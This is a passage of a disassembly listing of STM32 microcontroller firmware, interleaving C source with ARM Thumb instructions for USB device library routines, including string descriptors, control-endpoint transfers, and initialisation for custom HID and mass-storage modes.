  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c21e:	6938      	ldr	r0, [r7, #16]
 800c220:	f000 f836 	bl	800c290 <USBD_GetLen>
 800c224:	4603      	mov	r3, r0
 800c226:	3301      	adds	r3, #1
 800c228:	b29b      	uxth	r3, r3
 800c22a:	005b      	lsls	r3, r3, #1
 800c22c:	b29a      	uxth	r2, r3
 800c22e:	687b      	ldr	r3, [r7, #4]
 800c230:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c232:	7dfb      	ldrb	r3, [r7, #23]
 800c234:	68ba      	ldr	r2, [r7, #8]
 800c236:	4413      	add	r3, r2
 800c238:	687a      	ldr	r2, [r7, #4]
 800c23a:	7812      	ldrb	r2, [r2, #0]
 800c23c:	701a      	strb	r2, [r3, #0]
  idx++;
 800c23e:	7dfb      	ldrb	r3, [r7, #23]
 800c240:	3301      	adds	r3, #1
 800c242:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c244:	7dfb      	ldrb	r3, [r7, #23]
 800c246:	68ba      	ldr	r2, [r7, #8]
 800c248:	4413      	add	r3, r2
 800c24a:	2203      	movs	r2, #3
 800c24c:	701a      	strb	r2, [r3, #0]
  idx++;
 800c24e:	7dfb      	ldrb	r3, [r7, #23]
 800c250:	3301      	adds	r3, #1
 800c252:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c254:	e013      	b.n	800c27e <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c256:	7dfb      	ldrb	r3, [r7, #23]
 800c258:	68ba      	ldr	r2, [r7, #8]
 800c25a:	4413      	add	r3, r2
 800c25c:	693a      	ldr	r2, [r7, #16]
 800c25e:	7812      	ldrb	r2, [r2, #0]
 800c260:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c262:	693b      	ldr	r3, [r7, #16]
 800c264:	3301      	adds	r3, #1
 800c266:	613b      	str	r3, [r7, #16]
    idx++;
 800c268:	7dfb      	ldrb	r3, [r7, #23]
 800c26a:	3301      	adds	r3, #1
 800c26c:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c26e:	7dfb      	ldrb	r3, [r7, #23]
 800c270:	68ba      	ldr	r2, [r7, #8]
 800c272:	4413      	add	r3, r2
 800c274:	2200      	movs	r2, #0
 800c276:	701a      	strb	r2, [r3, #0]
    idx++;
 800c278:	7dfb      	ldrb	r3, [r7, #23]
 800c27a:	3301      	adds	r3, #1
 800c27c:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c27e:	693b      	ldr	r3, [r7, #16]
 800c280:	781b      	ldrb	r3, [r3, #0]
 800c282:	2b00      	cmp	r3, #0
 800c284:	d1e7      	bne.n	800c256 <USBD_GetString+0x52>
 800c286:	e000      	b.n	800c28a <USBD_GetString+0x86>
    return;
 800c288:	bf00      	nop
  }
}
 800c28a:	3718      	adds	r7, #24
 800c28c:	46bd      	mov	sp, r7
 800c28e:	bd80      	pop	{r7, pc}

0800c290 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c290:	b480      	push	{r7}
 800c292:	b085      	sub	sp, #20
 800c294:	af00      	add	r7, sp, #0
 800c296:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c298:	2300      	movs	r3, #0
 800c29a:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c29c:	687b      	ldr	r3, [r7, #4]
 800c29e:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c2a0:	e005      	b.n	800c2ae <USBD_GetLen+0x1e>
  {
    len++;
 800c2a2:	7bfb      	ldrb	r3, [r7, #15]
 800c2a4:	3301      	adds	r3, #1
 800c2a6:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c2a8:	68bb      	ldr	r3, [r7, #8]
 800c2aa:	3301      	adds	r3, #1
 800c2ac:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c2ae:	68bb      	ldr	r3, [r7, #8]
 800c2b0:	781b      	ldrb	r3, [r3, #0]
 800c2b2:	2b00      	cmp	r3, #0
 800c2b4:	d1f5      	bne.n	800c2a2 <USBD_GetLen+0x12>
  }

  return len;
 800c2b6:	7bfb      	ldrb	r3, [r7, #15]
}
 800c2b8:	4618      	mov	r0, r3
 800c2ba:	3714      	adds	r7, #20
 800c2bc:	46bd      	mov	sp, r7
 800c2be:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c2c2:	4770      	bx	lr

0800c2c4 <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c2c4:	b580      	push	{r7, lr}
 800c2c6:	b084      	sub	sp, #16
 800c2c8:	af00      	add	r7, sp, #0
 800c2ca:	60f8      	str	r0, [r7, #12]
 800c2cc:	60b9      	str	r1, [r7, #8]
 800c2ce:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c2d0:	68fb      	ldr	r3, [r7, #12]
 800c2d2:	2202      	movs	r2, #2
 800c2d4:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c2d8:	68fb      	ldr	r3, [r7, #12]
 800c2da:	687a      	ldr	r2, [r7, #4]
 800c2dc:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c2de:	68fb      	ldr	r3, [r7, #12]
 800c2e0:	687a      	ldr	r2, [r7, #4]
 800c2e2:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c2e4:	687b      	ldr	r3, [r7, #4]
 800c2e6:	68ba      	ldr	r2, [r7, #8]
 800c2e8:	2100      	movs	r1, #0
 800c2ea:	68f8      	ldr	r0, [r7, #12]
 800c2ec:	f000 fdbc 	bl	800ce68 <USBD_LL_Transmit>

  return USBD_OK;
 800c2f0:	2300      	movs	r3, #0
}
 800c2f2:	4618      	mov	r0, r3
 800c2f4:	3710      	adds	r7, #16
 800c2f6:	46bd      	mov	sp, r7
 800c2f8:	bd80      	pop	{r7, pc}

0800c2fa <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c2fa:	b580      	push	{r7, lr}
 800c2fc:	b084      	sub	sp, #16
 800c2fe:	af00      	add	r7, sp, #0
 800c300:	60f8      	str	r0, [r7, #12]
 800c302:	60b9      	str	r1, [r7, #8]
 800c304:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c306:	687b      	ldr	r3, [r7, #4]
 800c308:	68ba      	ldr	r2, [r7, #8]
 800c30a:	2100      	movs	r1, #0
 800c30c:	68f8      	ldr	r0, [r7, #12]
 800c30e:	f000 fdab 	bl	800ce68 <USBD_LL_Transmit>

  return USBD_OK;
 800c312:	2300      	movs	r3, #0
}
 800c314:	4618      	mov	r0, r3
 800c316:	3710      	adds	r7, #16
 800c318:	46bd      	mov	sp, r7
 800c31a:	bd80      	pop	{r7, pc}

0800c31c <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c31c:	b580      	push	{r7, lr}
 800c31e:	b084      	sub	sp, #16
 800c320:	af00      	add	r7, sp, #0
 800c322:	60f8      	str	r0, [r7, #12]
 800c324:	60b9      	str	r1, [r7, #8]
 800c326:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c328:	68fb      	ldr	r3, [r7, #12]
 800c32a:	2203      	movs	r2, #3
 800c32c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c330:	68fb      	ldr	r3, [r7, #12]
 800c332:	687a      	ldr	r2, [r7, #4]
 800c334:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c338:	68fb      	ldr	r3, [r7, #12]
 800c33a:	687a      	ldr	r2, [r7, #4]
 800c33c:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c340:	687b      	ldr	r3, [r7, #4]
 800c342:	68ba      	ldr	r2, [r7, #8]
 800c344:	2100      	movs	r1, #0
 800c346:	68f8      	ldr	r0, [r7, #12]
 800c348:	f000 fdc6 	bl	800ced8 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c34c:	2300      	movs	r3, #0
}
 800c34e:	4618      	mov	r0, r3
 800c350:	3710      	adds	r7, #16
 800c352:	46bd      	mov	sp, r7
 800c354:	bd80      	pop	{r7, pc}

0800c356 <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c356:	b580      	push	{r7, lr}
 800c358:	b084      	sub	sp, #16
 800c35a:	af00      	add	r7, sp, #0
 800c35c:	60f8      	str	r0, [r7, #12]
 800c35e:	60b9      	str	r1, [r7, #8]
 800c360:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c362:	687b      	ldr	r3, [r7, #4]
 800c364:	68ba      	ldr	r2, [r7, #8]
 800c366:	2100      	movs	r1, #0
 800c368:	68f8      	ldr	r0, [r7, #12]
 800c36a:	f000 fdb5 	bl	800ced8 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c36e:	2300      	movs	r3, #0
}
 800c370:	4618      	mov	r0, r3
 800c372:	3710      	adds	r7, #16
 800c374:	46bd      	mov	sp, r7
 800c376:	bd80      	pop	{r7, pc}

0800c378 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c378:	b580      	push	{r7, lr}
 800c37a:	b082      	sub	sp, #8
 800c37c:	af00      	add	r7, sp, #0
 800c37e:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c380:	687b      	ldr	r3, [r7, #4]
 800c382:	2204      	movs	r2, #4
 800c384:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c388:	2300      	movs	r3, #0
 800c38a:	2200      	movs	r2, #0
 800c38c:	2100      	movs	r1, #0
 800c38e:	6878      	ldr	r0, [r7, #4]
 800c390:	f000 fd6a 	bl	800ce68 <USBD_LL_Transmit>

  return USBD_OK;
 800c394:	2300      	movs	r3, #0
}
 800c396:	4618      	mov	r0, r3
 800c398:	3708      	adds	r7, #8
 800c39a:	46bd      	mov	sp, r7
 800c39c:	bd80      	pop	{r7, pc}

0800c39e <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c39e:	b580      	push	{r7, lr}
 800c3a0:	b082      	sub	sp, #8
 800c3a2:	af00      	add	r7, sp, #0
 800c3a4:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c3a6:	687b      	ldr	r3, [r7, #4]
 800c3a8:	2205      	movs	r2, #5
 800c3aa:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c3ae:	2300      	movs	r3, #0
 800c3b0:	2200      	movs	r2, #0
 800c3b2:	2100      	movs	r1, #0
 800c3b4:	6878      	ldr	r0, [r7, #4]
 800c3b6:	f000 fd8f 	bl	800ced8 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c3ba:	2300      	movs	r3, #0
}
 800c3bc:	4618      	mov	r0, r3
 800c3be:	3708      	adds	r7, #8
 800c3c0:	46bd      	mov	sp, r7
 800c3c2:	bd80      	pop	{r7, pc}

0800c3c4 <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c3c4:	b580      	push	{r7, lr}
 800c3c6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c3c8:	2200      	movs	r2, #0
 800c3ca:	4912      	ldr	r1, [pc, #72]	; (800c414 <MX_USB_DEVICE_Init+0x50>)
 800c3cc:	4812      	ldr	r0, [pc, #72]	; (800c418 <MX_USB_DEVICE_Init+0x54>)
 800c3ce:	f7fe fd68 	bl	800aea2 <USBD_Init>
 800c3d2:	4603      	mov	r3, r0
 800c3d4:	2b00      	cmp	r3, #0
 800c3d6:	d001      	beq.n	800c3dc <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c3d8:	f7f4 fc7e 	bl	8000cd8 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c3dc:	490f      	ldr	r1, [pc, #60]	; (800c41c <MX_USB_DEVICE_Init+0x58>)
 800c3de:	480e      	ldr	r0, [pc, #56]	; (800c418 <MX_USB_DEVICE_Init+0x54>)
 800c3e0:	f7fe fd8f 	bl	800af02 <USBD_RegisterClass>
 800c3e4:	4603      	mov	r3, r0
 800c3e6:	2b00      	cmp	r3, #0
 800c3e8:	d001      	beq.n	800c3ee <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c3ea:	f7f4 fc75 	bl	8000cd8 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c3ee:	490c      	ldr	r1, [pc, #48]	; (800c420 <MX_USB_DEVICE_Init+0x5c>)
 800c3f0:	4809      	ldr	r0, [pc, #36]	; (800c418 <MX_USB_DEVICE_Init+0x54>)
 800c3f2:	f7fc fca5 	bl	8008d40 <USBD_CUSTOM_HID_RegisterInterface>
 800c3f6:	4603      	mov	r3, r0
 800c3f8:	2b00      	cmp	r3, #0
 800c3fa:	d001      	beq.n	800c400 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c3fc:	f7f4 fc6c 	bl	8000cd8 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c400:	4805      	ldr	r0, [pc, #20]	; (800c418 <MX_USB_DEVICE_Init+0x54>)
 800c402:	f7fe fdb4 	bl	800af6e <USBD_Start>
 800c406:	4603      	mov	r3, r0
 800c408:	2b00      	cmp	r3, #0
 800c40a:	d001      	beq.n	800c410 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c40c:	f7f4 fc64 	bl	8000cd8 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c410:	bf00      	nop
 800c412:	bd80      	pop	{r7, pc}
 800c414:	200001ac 	.word	0x200001ac
 800c418:	200003c0 	.word	0x200003c0
 800c41c:	2000002c 	.word	0x2000002c
 800c420:	2000019c 	.word	0x2000019c

0800c424 <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c424:	b580      	push	{r7, lr}
 800c426:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c428:	2200      	movs	r2, #0
 800c42a:	4912      	ldr	r1, [pc, #72]	; (800c474 <MX_USB_DEVICE_Init_MSC+0x50>)
 800c42c:	4812      	ldr	r0, [pc, #72]	; (800c478 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c42e:	f7fe fd38 	bl	800aea2 <USBD_Init>
 800c432:	4603      	mov	r3, r0
 800c434:	2b00      	cmp	r3, #0
 800c436:	d001      	beq.n	800c43c <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c438:	f7f4 fc4e 	bl	8000cd8 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c43c:	490f      	ldr	r1, [pc, #60]	; (800c47c <MX_USB_DEVICE_Init_MSC+0x58>)
 800c43e:	480e      	ldr	r0, [pc, #56]	; (800c478 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c440:	f7fe fd5f 	bl	800af02 <USBD_RegisterClass>
 800c444:	4603      	mov	r3, r0
 800c446:	2b00      	cmp	r3, #0
 800c448:	d001      	beq.n	800c44e <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c44a:	f7f4 fc45 	bl	8000cd8 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c44e:	490c      	ldr	r1, [pc, #48]	; (800c480 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c450:	4809      	ldr	r0, [pc, #36]	; (800c478 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c452:	f7fc ff27 	bl	80092a4 <USBD_MSC_RegisterStorage>
 800c456:	4603      	mov	r3, r0
 800c458:	2b00      	cmp	r3, #0
 800c45a:	d001      	beq.n	800c460 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c45c:	f7f4 fc3c 	bl	8000cd8 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c460:	4805      	ldr	r0, [pc, #20]	; (800c478 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c462:	f7fe fd84 	bl	800af6e <USBD_Start>
 800c466:	4603      	mov	r3, r0
 800c468:	2b00      	cmp	r3, #0
 800c46a:	d001      	beq.n	800c470 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c46c:	f7f4 fc34 	bl	8000cd8 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c470:	bf00      	nop
 800c472:	bd80      	pop	{r7, pc}
 800c474:	200001ac 	.word	0x200001ac
 800c478:	2000069c 	.word	0x2000069c
 800c47c:	200000a8 	.word	0x200000a8
 800c480:	20000220 	.word	0x20000220

0800c484 <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c484:	b480      	push	{r7}
 800c486:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c488:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c48a:	4618      	mov	r0, r3
 800c48c:	46bd      	mov	sp, r7
 800c48e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c492:	4770      	bx	lr

0800c494 <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c494:	b480      	push	{r7}
 800c496:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c498:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c49a:	4618      	mov	r0, r3
 800c49c:	46bd      	mov	sp, r7
 800c49e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c4a2:	4770      	bx	lr

0800c4a4 <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c4a4:	b580      	push	{r7, lr}
 800c4a6:	b082      	sub	sp, #8
 800c4a8:	af00      	add	r7, sp, #0
 800c4aa:	4603      	mov	r3, r0
 800c4ac:	460a      	mov	r2, r1
 800c4ae:	71fb      	strb	r3, [r7, #7]
 800c4b0:	4613      	mov	r3, r2
 800c4b2:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
 800c4b4:	4803      	ldr	r0, [pc, #12]	; (800c4c4 <CUSTOM_HID_OutEvent_FS+0x20>)
 800c4b6:	f7fc fbd1 	bl	8008c5c <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c4ba:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c4bc:	4618      	mov	r0, r3
 800c4be:	3708      	adds	r7, #8
 800c4c0:	46bd      	mov	sp, r7
 800c4c2:	bd80      	pop	{r7, pc}
 800c4c4:	200003c0 	.word	0x200003c0

0800c4c8 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c4c8:	b480      	push	{r7}
 800c4ca:	b083      	sub	sp, #12
 800c4cc:	af00      	add	r7, sp, #0
 800c4ce:	4603      	mov	r3, r0
 800c4d0:	6039      	str	r1, [r7, #0]
 800c4d2:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c4d4:	683b      	ldr	r3, [r7, #0]
 800c4d6:	2212      	movs	r2, #18
 800c4d8:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c4da:	4b06      	ldr	r3, [pc, #24]	; (800c4f4 <USBD_FS_DeviceDescriptor+0x2c>)
 800c4dc:	681b      	ldr	r3, [r3, #0]
 800c4de:	2b01      	cmp	r3, #1
 800c4e0:	d101      	bne.n	800c4e6 <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c4e2:	4b05      	ldr	r3, [pc, #20]	; (800c4f8 <USBD_FS_DeviceDescriptor+0x30>)
 800c4e4:	e000      	b.n	800c4e8 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c4e6:	4b05      	ldr	r3, [pc, #20]	; (800c4fc <USBD_FS_DeviceDescriptor+0x34>)
}
 800c4e8:	4618      	mov	r0, r3
 800c4ea:	370c      	adds	r7, #12
 800c4ec:	46bd      	mov	sp, r7
 800c4ee:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c4f2:	4770      	bx	lr
 800c4f4:	20000978 	.word	0x20000978
 800c4f8:	200001cc 	.word	0x200001cc
 800c4fc:	200001e0 	.word	0x200001e0

0800c500 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c500:	b480      	push	{r7}
 800c502:	b083      	sub	sp, #12
 800c504:	af00      	add	r7, sp, #0
 800c506:	4603      	mov	r3, r0
 800c508:	6039      	str	r1, [r7, #0]
 800c50a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c50c:	683b      	ldr	r3, [r7, #0]
 800c50e:	2204      	movs	r2, #4
 800c510:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c512:	4b03      	ldr	r3, [pc, #12]	; (800c520 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c514:	4618      	mov	r0, r3
 800c516:	370c      	adds	r7, #12
 800c518:	46bd      	mov	sp, r7
 800c51a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c51e:	4770      	bx	lr
 800c520:	20000200 	.word	0x20000200

0800c524 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c524:	b580      	push	{r7, lr}
 800c526:	b082      	sub	sp, #8
 800c528:	af00      	add	r7, sp, #0
 800c52a:	4603      	mov	r3, r0
 800c52c:	6039      	str	r1, [r7, #0]
 800c52e:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c530:	79fb      	ldrb	r3, [r7, #7]
 800c532:	2b00      	cmp	r3, #0
 800c534:	d105      	bne.n	800c542 <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c536:	683a      	ldr	r2, [r7, #0]
 800c538:	4907      	ldr	r1, [pc, #28]	; (800c558 <USBD_FS_ProductStrDescriptor+0x34>)
 800c53a:	4808      	ldr	r0, [pc, #32]	; (800c55c <USBD_FS_ProductStrDescriptor+0x38>)
 800c53c:	f7ff fe62 	bl	800c204 <USBD_GetString>
 800c540:	e004      	b.n	800c54c <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c542:	683a      	ldr	r2, [r7, #0]
 800c544:	4904      	ldr	r1, [pc, #16]	; (800c558 <USBD_FS_ProductStrDescriptor+0x34>)
 800c546:	4805      	ldr	r0, [pc, #20]	; (800c55c <USBD_FS_ProductStrDescriptor+0x38>)
 800c548:	f7ff fe5c 	bl	800c204 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c54c:	4b02      	ldr	r3, [pc, #8]	; (800c558 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c54e:	4618      	mov	r0, r3
 800c550:	3708      	adds	r7, #8
 800c552:	46bd      	mov	sp, r7
 800c554:	bd80      	pop	{r7, pc}
 800c556:	bf00      	nop
 800c558:	2000097c 	.word	0x2000097c
 800c55c:	0800d248 	.word	0x0800d248

0800c560 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c560:	b580      	push	{r7, lr}
 800c562:	b082      	sub	sp, #8
 800c564:	af00      	add	r7, sp, #0
 800c566:	4603      	mov	r3, r0
 800c568:	6039      	str	r1, [r7, #0]
 800c56a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c56c:	683a      	ldr	r2, [r7, #0]
 800c56e:	4904      	ldr	r1, [pc, #16]	; (800c580 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c570:	4804      	ldr	r0, [pc, #16]	; (800c584 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c572:	f7ff fe47 	bl	800c204 <USBD_GetString>
  return USBD_StrDesc;
 800c576:	4b02      	ldr	r3, [pc, #8]	; (800c580 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c578:	4618      	mov	r0, r3
 800c57a:	3708      	adds	r7, #8
 800c57c:	46bd      	mov	sp, r7
 800c57e:	bd80      	pop	{r7, pc}
 800c580:	2000097c 	.word	0x2000097c
 800c584:	0800d25c 	.word	0x0800d25c

0800c588 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c588:	b580      	push	{r7, lr}
 800c58a:	b082      	sub	sp, #8
 800c58c:	af00      	add	r7, sp, #0
 800c58e:	4603      	mov	r3, r0
 800c590:	6039      	str	r1, [r7, #0]
 800c592:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c594:	683b      	ldr	r3, [r7, #0]
 800c596:	221a      	movs	r2, #26
 800c598:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c59a:	f000 f855 	bl	800c648 <Get_SerialNum>
